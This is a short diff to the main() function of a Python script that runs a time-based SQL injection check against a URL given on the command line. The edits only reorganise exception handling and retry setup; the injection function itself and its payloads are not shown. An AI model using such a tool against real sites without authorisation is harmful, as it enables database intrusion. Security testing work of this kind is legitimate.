@@ -17,7 +17,7 @@ def main():
     try:
         url = sys.argv[1]
         session = requests.Session()
-        session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
+        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))
 
         print("(+) Attempting time based SQL Injection attack...")
         if time_based_sqli_check(url, session):
@@ -25,14 +25,17 @@ def main():
         else:
             print("(-) Time-based SQL injection attack unsuccessful. Please check your URL and try again.")
 
-    except requests.exceptions.MissingSchema:
-        print("(-) Please enter a valid URL.")
-
     except requests.exceptions.Timeout:
         print("(-) Request timed out.")
 
+    except requests.exceptions.MissingSchema:
+        print("(-) Please enter a valid URL.")
+
     except requests.exceptions.ConnectionError:
         print("(-) Unable to connect to host. Please check your URL and try again.")
+
+    except KeyboardInterrupt:
+        sys.exit(1)
 
 
 if __name__ == "__main__":
